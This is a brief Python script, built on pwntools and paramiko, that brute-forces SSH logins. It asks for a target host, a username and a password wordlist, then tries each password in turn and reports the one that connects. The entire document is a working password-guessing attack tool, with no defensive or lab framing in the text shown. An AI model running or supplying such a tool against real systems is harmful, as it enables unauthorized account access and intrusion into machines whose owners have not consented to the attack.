from pwn import *
import paramiko

host = input("[>] Enter the Host IP: ")
username = input("[>] Enter the user: ")
password_file_path = input("[>] Enter the path to the password file: ")
attempts = 0

with open(password_file_path, "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, username=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[>] Invalid password !")
        attempts += 1